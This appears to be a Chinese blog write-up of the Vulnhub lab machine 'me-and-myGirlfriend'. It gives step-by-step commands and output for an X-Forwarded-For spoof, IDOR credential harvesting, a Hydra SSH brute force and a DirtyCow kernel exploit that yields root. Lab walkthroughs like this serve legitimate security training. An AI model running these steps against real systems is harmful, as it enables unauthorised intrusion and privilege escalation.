---
layout: post
toc: true
title: "「渗透」：vulnhub-me-and-myGirlfriend"
date: 2020-01-08
author: Bin4xin
categories:
  - blog
  - 漏洞复现
  - 渗透
  - vulnhub
permalink: /blog/2020/vulnhub-me-and-myGirlfriend/
---

> Vulnhub靶机练习，涉及Web IP限制绕过、参数泄露、SSH爆破、信息收集与提权。靶机名称`me-and-myGirlfriend`，难度中等。

## 0x00 嗅探靶机

### nmap开路

首先扫描内网识别靶机IP，通过MAC地址后缀`Oracle VirtualBox`确认靶机：

```bash
root@bin4xin:/usr/share/wordlist# nmap -sP 192.168.3.0/24

Nmap scan report for 192.168.3.59
Host is up (0.00033s latency).
MAC Address: 08:00:27:FD:9B:9B (Oracle VirtualBox virtual NIC)
```

靶机IP确认为`192.168.3.59`，进一步扫描端口和服务：

```bash
root@bin4xin:/usr/share/wordlist# nmap -A -O 192.168.3.59

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
Device type: general purpose
Running: Linux 3.X|4.X
OS details: Linux 3.2 - 4.8
```

开放了**SSH(22)**和**HTTP(80)**两个服务。

## 0x01 Web端：IP限制绕过

访问Web服务时发现存在IP限制，需要在请求头中添加`X-Forwarded-For: localhost`绕过：

```bash
GET /?page=index HTTP/1.1
Host: 192.168.3.59
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
x-forwarded-for:localhost
Connection: close
Upgrade-Insecure-Requests: 1
```

> **原理**：后端代码使用`X-Forwarded-For`头判断请求来源IP，伪造为`localhost`即可绕过限制。

加上本地头IP后，正常回显登录页面：

```bash
HTTP/1.1 200 OK
Date: Wed, 08 Jan 2020 09:36:34 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Set-Cookie: PHPSESSID=72l97ppkrc8kgffl3n72dv37f3; path=/
Content-Type: text/html

<title>Ceban Corp</title>
...
<p><a href="?page=index">Home</a> | <a href="?page=login">Login</a> |
<a href="?page=register">Register</a> | <a href="?page=about">About</a></p>
```

页面包含`Home`、`Login`、`Register`、`About`四个功能。

## 0x02 Web端：参数泄露用户信息

绕过IP限制后，在主页进行`注册` → `登录` → `修改user_id参数`操作。

通过Burp Suite抓包，修改请求中的`user_id`参数，可以遍历获取其他用户的个人信息（包括用户名和密码）：

![](/assets/img/post-pic/post-gf-bp.png)

> **漏洞类型**：IDOR（不安全的直接对象引用），通过篡改`user_id`参数可越权访问其他用户数据。

从泄露的用户信息中提取所有用户名和密码，准备后续SSH爆破。

## 0x03 SSH爆破

根据Web端泄露的用户名密码，新建字典文件进行SSH爆破：

```bash
# 创建用户名字典
root@bin4xin:/usr/share/wordlist# vi user
# 内容为Web端泄露的所有用户名

# 创建密码字典
root@bin4xin:/usr/share/wordlist# vi pass
# 内容为Web端泄露的所有密码
```

使用Hydra进行SSH爆破：

```bash
root@bin4xin:/usr/share/wordlist# hydra -L user -P pass ssh://192.168.3.59

Hydra (http://www.thc.org/thc-hydra) starting at 2020-01-08 09:56:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:6/p:6), ~3 tries per task
[DATA] attacking ssh://192.168.3.59:22/
[22][ssh] host: 192.168.3.59   login: alice   password: 4lic3
1 of 1 target successfully completed, 1 valid password found
```

爆破成功：**用户名`alice`，密码`4lic3`**。

## 0x04 登录靶机

```bash
C:\Users\本阿信>ssh 192.168.3.59 -l alice
alice@192.168.3.59's password:
Last login: Fri Dec 13 14:48:25 2019
alice@gfriEND:~$ id
uid=1000(alice) gid=1001(alice) groups=1001(alice)
```

成功获取alice用户的shell。

## 0x05 信息收集与Flag1

登录后按套路进行信息收集，首先查找可写的目录：

```bash
alice@gfriEND:~$ find / -writable -type d 2>/dev/null
/home/alice
/home/alice/.cache
/home/alice/.my_secret
/run/user/1000
/run/shm
/run/lock
/tmp
/var/lib/php5
/var/crash
/var/tmp
```

发现隐藏目录`.my_secret`：

```bash
alice@gfriEND:~$ cd .my_secret/
alice@gfriEND:~/.my_secret$ ls -la
total 16
drwxrwxr-x 2 alice alice 4096 Dec 13 14:10 .
drwxr-xr-x 4 alice alice 4096 Dec 13 14:47 ..
-rw-r--r-- 1 root  root   306 Dec 13 13:04 flag1.txt
-rw-rw-r-1 alice alice  119 Dec 13 12:23 my_notes.txt

alice@gfriEND:~/.my_secret$ cat flag1.txt
Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob!
I know if it's given to him then Bob will be hurt but this is better than Bob cheated!

Now your last job is get access to the root and read the flag ^_^

Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}

alice@gfriEND:~/.my_secret$ cat my_notes.txt
Woahhh! I like this company, I hope that here i get a better partner than bob ^_^,
hopefully Bob doesn't know my notes
```

**Flag 1**：`gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}`

## 0x06 横向移动：其他用户枚举

查看系统中的其他用户：

```bash
alice@gfriEND:/home$ ls -la
total 24
drwxr-xr-x  6 root           root           4096 Dec 13 12:18 .
drwxr-xr-x 22 root           root           4096 Dec 13 10:21 ..
drwxr-xr-x  2 aingmaung      aingmaung      4096 Dec 13 12:18 aingmaung
drwxr-xr-x  4 alice          alice          4096 Dec 13 14:47 alice
drwxr-xr-x  2 eweuhtandingan eweuhtandingan 4096 Dec 13 12:18 eweuhtandingan
drwxr-xr-x  2 sundatea       sundatea       4096 Dec 13 12:18 sundatea
```

系统中存在4个普通用户：`aingmaung`、`alice`、`eweuhtandingan`、`sundatea`。

尝试使用Web端泄露的密码交叉登录其他用户：

```bash
alice@gfriEND:~$ su bob
Password:
su: Authentication failure

alice@gfriEND:~$ su eweuhtandingan
Password:
eweuhtandingan@gfriEND:/home/alice$
```

## 0x07 提权到Root

### SUID/SGID枚举

```bash
alice@gfriEND:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/sbin/pppd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/bin/su
/bin/umount
/bin/mount
/bin/ping
```

### Sudo权限检查

```bash
alice@gfriEND:~$ sudo -l
[sudo] password for alice:
Sorry, user alice may not run sudo on gfriEND.
```

### 内核漏洞提权

检查内核版本，寻找可用的提权EXP：

```bash
alice@gfriEND:~$ uname -a
Linux gfriEND 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

内核版本`3.13.0-24`，可以使用**DirtyCow（脏牛漏洞 CVE-2016-5195）**提权：

```bash
# 攻击机编译EXP
gcc -pthread dirty.c -o dirty -lcrypt

# 上传到靶机
scp dirty alice@192.168.3.59:/tmp/

# 靶机执行
alice@gfriEND:/tmp$ chmod +x dirty
alice@gfriEND:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: hacker

[*] run passwd root to change root password.
[*] su firefart
[*] rm /tmp/dirty
```

### 获取Root权限

```bash
alice@gfriEND:/tmp$ su firefart
Password: hacker

firefart@gfriEND:/tmp# id
uid=0(root) gid=0(root) groups=0(root)

firefart@gfriEND:/tmp# cat /root/root.txt
```

### 恢复原始passwd文件

提权后记得恢复`/etc/passwd`：

```bash
firefart@gfriEND:/tmp# cp /tmp/passwd.bak /etc/passwd
```

## 0x08 提权路径总结

```
nmap扫描 → 识别靶机IP(Oracle VirtualBox MAC)
    │
    ▼
Web IP限制绕过 → X-Forwarded-For: localhost
    │
    ▼
IDOR漏洞 → user_id参数遍历 → 泄露用户名密码
    │
    ▼
Hydra SSH爆破 → alice:4lic3
    │
    ▼
信息收集 → .my_secret/flag1.txt (Flag1)
    │
    ▼
内核版本3.13.0-24 → DirtyCow提权 → root
    │
    ▼
/root/root.txt (Flag2)
```

## 0x09 知识点总结

1. **X-Forwarded-For绕过**：Web应用信任代理头时，可通过伪造`XFF`头绕过IP限制
2. **IDOR漏洞**：修改`user_id`等参数可越权访问其他用户数据
3. **密码复用**：Web端泄露的密码可直接用于SSH登录（撞库攻击）
4. **Hydra爆破**：基于字典的SSH服务暴力破解
5. **DirtyCow提权**：Linux内核3.13 ~ 4.8范围内的本地提权漏洞（CVE-2016-5195）

## 参考

- [Vulnhub - me-and-myGirlfriend](https://www.vulnhub.com/entry/me-and-mygirlfriend-1,406/){:target="_blank"}
- [DirtyCow - CVE-2016-5195](https://dirtycow.ninja/){:target="_blank"}
- [Hydra - 暴力破解工具](https://github.com/vanhauser-thc/thc-hydra){:target="_blank"}

以上。